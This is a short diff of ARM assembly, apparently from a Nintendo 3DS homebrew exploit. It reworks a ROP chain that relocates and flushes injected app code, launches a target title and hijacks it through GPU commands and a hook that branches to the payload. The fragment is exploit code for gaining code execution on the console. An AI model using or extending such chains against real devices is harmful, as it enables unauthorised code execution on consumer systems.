@@ -340,6 +340,8 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.word ROP_MENU_BX_LR ; bx lr
 .endmacro
 
+.include "app_code_reloc.s"
+
 .orga 0x0
 
 	object:
@@ -353,13 +355,19 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + fsUserString, 0x8, MENU_FS_HANDLE
 			apt_close_session 0
 
-		; launch app that we want to takeover
-			nss_launch_title 0xBABE0004, 0xBABE0005
-
 		; adjust gsp commands (can't preprocess aliases)
 			add_and_store_3 APP_START_LINEAR, 0xBABE0003, 0 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppHook - object + 0x8
-			add_and_store APP_START_LINEAR, 0x00105000 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppCode - object + 0x8
+			add_and_store_3 APP_START_LINEAR, 0xBABE0007, 0 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppCode - object + 0x8
 			store MENU_LOADEDROP_BUFADR + appBootloader - object, MENU_OBJECT_LOC + appCode + 0x4
+
+		; relocate app_code
+			relocate
+
+		; flush app_code because we just wrote to it and are about to DMA it
+			flush_dcache MENU_OBJECT_LOC + appCode, 0x4000
+
+		; launch app that we want to takeover
+			nss_launch_title 0xBABE0004, 0xBABE0005
 
 		; takeover app
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
@@ -471,10 +479,18 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.align 0x20
 	appHook:
 		.arm
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
 			ldr r0, =200*1000*1000 ; 200ms
 			ldr r1, =0x00000000
 			.word 0xef00000a ; svcSleepThread
-			ldr r2, =0x00105000
+			ldr r2, =0xBABE0007
 			blx r2
 			
 		.pool
